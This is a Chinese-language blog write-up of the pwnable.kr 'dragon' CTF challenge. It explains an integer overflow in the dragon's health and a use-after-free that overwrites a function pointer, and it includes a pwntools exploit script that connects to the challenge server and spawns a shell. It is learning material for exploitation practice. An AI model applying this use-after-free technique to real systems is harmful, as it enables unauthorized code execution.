---
title: pwnable dragon
tags: [Linux]
date: 2017-06-24 00:23
---
借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><blockquote>
<p>借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。</p>
</blockquote>
<p>题目地址： <br>
nc pwnable.kr 9004 <br>
题目下载： <br>
<a href="http://pwnable.kr/bin/dragon">http://pwnable.kr/bin/dragon</a></br></br></br></p>
<h1 id="0x01-简单分析">0x01 简单分析</h1>
<p>这题是让我们打龙，首先利用IDA查看龙的相关信息 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623230511757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
上面是两个龙的结构体</br></img></br></p>
<p>又发现了一个神秘关卡 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623230738531?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p>里面有要获取的shell</p>
<p>发现在杀死龙之后会释放龙内存，同时也会重新申请相同大小的内存进行写入而且偏移量正好是龙结构体的函数指针处。这样我们就能利用UAF（释放重利用）控制整个程序流。下面第一个难题是怎样杀死一条龙。</p>
<h1 id="0x02-屠龙">0x02 屠龙</h1>
<p>Priest <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623235140524?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
Knight <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170624001143324?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></p>
<p>我们发现如果是直接想把龙打死是不可能的但是我们发现了一个技能Priest的3技能 <br>
可以是龙的回升.同时发现大龙的血是80 一个字节127可以使其溢出，从而把大龙打死。</br></p>
<h1 id="0x03-编写exp">0x03 编写exp</h1>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
sh = remote(<span class="hljs-string">'pwnable.kr'</span>,<span class="hljs-number">9004</span>) <span class="hljs-comment">#process('./dragon')</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">killself</span><span class="hljs-params">(sh)</span>:</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>):
        sh.send(<span class="hljs-string">'1'</span>+<span class="hljs-string">'\n'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">killdragon</span><span class="hljs-params">(sh)</span>:</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):
        sh.send(<span class="hljs-string">'3'</span>+<span class="hljs-string">'\n'</span>)
        sh.send(<span class="hljs-string">'3'</span>+<span class="hljs-string">'\n'</span>)
        sh.send(<span class="hljs-string">'2'</span>+<span class="hljs-string">'\n'</span>)       


killself(sh)
sh.send(<span class="hljs-string">'1'</span>+<span class="hljs-string">'\n'</span>)
killdragon(sh)
sh.send(p32(<span class="hljs-number">0x08048DBF</span>))
sh.interactive()</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170624002304784?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p></div>